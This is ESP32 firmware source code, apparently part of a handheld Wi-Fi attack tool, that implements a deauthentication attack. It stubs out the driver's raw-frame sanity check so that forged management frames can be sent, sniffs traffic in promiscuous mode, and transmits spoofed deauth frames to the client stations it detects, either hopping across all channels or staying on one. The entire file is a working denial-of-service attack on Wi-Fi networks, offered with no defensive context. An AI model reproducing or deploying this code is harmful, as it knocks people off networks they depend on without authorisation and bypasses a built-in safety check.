#include "deauth.h"

extern "C" int ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c)
{
  return 0;
}

static const wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA};

struct __attribute__((packed))
{
  uint8_t  fc[2] = {0xC0, 0x00};
  uint8_t  dur[2];
  uint8_t  sta[6];
  uint8_t  src[6];
  uint8_t  ap[6];
  uint8_t  seq[2] = {0xF0, 0xFF};
  uint16_t reason = 0x01;
} deauth;

void sniffer(void *buf, wifi_promiscuous_pkt_type_t type)
{
  const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  const uint8_t                *mac = pkt->payload + 4;
  if ( memcmp(mac, mac + 12, 6) == 0 && memcmp(mac, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) )
  {
    memcpy(deauth.sta, mac + 6, 6);
    memcpy(deauth.ap, mac, 6);
    memcpy(deauth.src, mac, 6);
    digitalWrite(2, HIGH);
    delay(15);
    esp_wifi_80211_tx(WIFI_IF_STA, &deauth, sizeof(deauth), false);
    digitalWrite(2, LOW);
  }
}

void wifi_deauth_all()
{
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
  esp_wifi_set_promiscuous_filter(&filter);
  btnNext.tick();
  btnOK.tick();
  btnPrevious.tick();
  bool SerialStop = true;

  while ( (!btnNext.isSingle() && !btnPrevious.isSingle() && !btnOK.isDouble() && !btnOK.isSingle()) && SerialStop )
  {
    for ( int channel = 0; channel < 14; channel++ )
    {
      btnNext.tick();
      btnOK.tick();
      btnPrevious.tick();
      SerialStop = SerialCommands();
      delay(10);
      esp_wifi_set_channel(channel + 1, WIFI_SECOND_CHAN_NONE);
      if ( !SerialStop )
        break;
    }
  }
  esp_wifi_set_promiscuous(false);
  String current_ssid     = getSSIDFromEEPROM();
  String current_password = getPasswordFromEEPROM();
  WiFi.softAP(current_ssid.c_str(), current_password.c_str());
}
void wifi_deauth_scan()
{
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
  esp_wifi_set_promiscuous_filter(&filter);
  btnNext.tick();
  btnOK.tick();
  btnPrevious.tick();
  int  scanCounter = 0;
  bool SerialStop  = true;

  while ( (!btnNext.isSingle() && !btnPrevious.isSingle() && !btnOK.isDouble() && !btnOK.isSingle()) && SerialStop )
  {
    if ( scanCounter >= 600 )
    {
      esp_wifi_set_promiscuous(false);
      NumberChannels = scan_wifi_APs(WiFiScanChannels, true);
      scanCounter    = 0;
      esp_wifi_set_promiscuous(true);
    }
    for ( int chIndex = 0; chIndex < NumberChannels; chIndex++ )
    {
      int wifiChannel = WiFiScanChannels[chIndex];
      btnNext.tick();
      btnOK.tick();
      btnPrevious.tick();
      SerialStop = SerialCommands();
      delay(10);
      esp_wifi_set_channel(wifiChannel, WIFI_SECOND_CHAN_NONE);
      if ( !SerialStop )
        break;
    }
    scanCounter++;
  }
  esp_wifi_set_promiscuous(false);
  String current_ssid     = getSSIDFromEEPROM();
  String current_password = getPasswordFromEEPROM();
  WiFi.softAP(current_ssid.c_str(), current_password.c_str());
}
void wifi_deauth_channel(int channel)
{
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
  esp_wifi_set_promiscuous_filter(&filter);
  btnNext.tick();
  btnOK.tick();
  btnPrevious.tick();
  bool SerialStop = true;

  while ( (!btnNext.isSingle() && !btnPrevious.isSingle() && !btnOK.isDouble() && !btnOK.isSingle()) && SerialStop )
  {
    btnNext.tick();
    btnOK.tick();
    btnPrevious.tick();
    SerialStop = SerialCommands();
    delay(10);
    if ( !SerialStop )
      break;
  }
  esp_wifi_set_promiscuous(false);
  String current_ssid     = getSSIDFromEEPROM();
  String current_password = getPasswordFromEEPROM();
  WiFi.softAP(current_ssid.c_str(), current_password.c_str());
}